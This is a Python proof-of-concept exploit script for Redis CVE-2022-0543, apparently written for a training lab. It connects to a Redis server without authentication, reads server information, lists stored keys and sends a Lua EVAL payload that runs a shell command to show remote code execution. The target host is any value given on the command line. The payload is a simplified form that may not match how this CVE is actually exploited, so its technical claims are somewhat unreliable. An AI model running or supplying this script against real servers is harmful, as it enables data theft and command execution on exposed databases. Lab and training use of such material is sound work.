#!/usr/bin/env python3
"""Redis NOAUTH RCE PoC (CVE-2022-0543)

Demonstrates unauthenticated access and command execution on Redis.
Educational proof-of-concept for KZ-Sploitable lab.
"""

import sys
import socket


def send_redis(sock, *args):
    """Send a RESP command and return the response."""
    cmd = f"*{len(args)}\r\n"
    for arg in args:
        cmd += f"${len(str(arg))}\r\n{arg}\r\n"
    sock.sendall(cmd.encode())
    return sock.recv(4096).decode("utf-8", errors="replace")


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "kz-redis"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 6379

    print(f"[*] Target: {host}:{port}")
    print(f"[*] CVE: CVE-2022-0543")
    print(f"[*] Type: NOAUTH Access + RCE via Lua")
    print()

    try:
        sock = socket.create_connection((host, port), timeout=10)
        print("[+] Connected to Redis")
        print()

        print("=== Phase 1: Info Gathering ===")
        resp = send_redis(sock, "INFO", "server")
        if "redis_version" in resp:
            for line in resp.split("\r\n"):
                if line.startswith("redis_version:"):
                    print(f"[+] {line}")
                elif line.startswith("os:"):
                    print(f"[+] {line}")
            print("[+] SUCCESS: Unauthenticated INFO command accepted")
        elif "NOAUTH" in resp or "ERR" in resp:
            print(f"[-] Auth required: {resp.strip()}")
            print("[*] Redis appears to require authentication (patched)")
            sock.close()
            print()
            print("[*] PoC execution complete")
            return
        print()

        print("=== Phase 2: Database Enumeration ===")
        resp = send_redis(sock, "DBSIZE")
        print(f"[+] DBSIZE: {resp.strip()}")

        resp = send_redis(sock, "KEYS", "*")
        keys = [l for l in resp.split("\r\n") if l and not l.startswith("*") and not l.startswith("$")]
        if keys:
            print(f"[+] Found {len(keys)} keys:")
            for k in keys[:10]:
                print(f"    - {k}")
        print()

        print("=== Phase 3: Lua RCE Test (CVE-2022-0543) ===")
        lua_payload = 'return io.popen("id"):read("*a")'
        resp = send_redis(sock, "EVAL", lua_payload, "0")
        if "uid=" in resp:
            print(f"[+] SUCCESS: RCE via Lua sandbox escape!")
            print(f"[+] Output: {resp.strip()}")
        elif "ERR" in resp:
            print(f"[-] Lua RCE blocked: {resp.strip()[:200]}")
            print("[*] CVE-2022-0543 may be patched in this version")
        else:
            print(f"[*] Response: {resp.strip()[:200]}")

        sock.close()

    except socket.timeout:
        print(f"[!] Connection timed out to {host}:{port}")
    except ConnectionRefusedError:
        print(f"[!] Connection refused at {host}:{port}")
        print(f"[*] Ensure the Redis container is running")
    except Exception as e:
        print(f"[!] Error: {e}")

    print()
    print("[*] PoC execution complete")


if __name__ == "__main__":
    main()
